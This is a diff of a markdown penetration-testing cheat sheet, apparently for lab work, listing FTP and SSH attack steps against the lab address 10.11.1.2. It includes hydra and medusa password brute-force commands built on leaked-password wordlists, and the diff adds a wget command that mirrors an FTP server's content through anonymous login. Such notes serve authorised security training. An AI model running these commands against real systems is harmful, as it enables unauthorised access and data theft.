@@ -14,7 +14,9 @@ example usage:
 * Bruteforce login (done by autorecon.sh with hydra and medusa)
   * manual examples:<br/>
 `hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "/root/Desktop/tcp_21_ftp_hydra.txt" ftp://10.11.1.2`<br/><br/>
-`medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 21 -O "/root/Desktop/tcp_21_ftp_medusa.txt" -M ftp -h 10.11.1.2`
+`medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 21 -O "/root/Desktop/tcp_21_ftp_medusa.txt" -M ftp -h 10.11.1.2`<br/>
+* Download content `wget -m ftp://anonymous:anonymous@10.11.1.2` <br/>
+
 ## SSH (22/tcp)
 * old version of ssh
 * public-key with weak crypto
@@ -23,6 +25,7 @@ example usage:
 `hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/root/Desktop/tcp_22_ssh_hydra.txt" ssh://10.11.1.2`<br/><br/>
 `medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/root/Desktop/tcp_22_ssh_medusa.txt" -M ssh -h 10.11.1.2`
 * Login with known username: `ssh username@10.11.1.2`<br/>
+* Download all content <br/>
 ## SMTP (25/tcp)
 * Enumartion of usernames
 ```
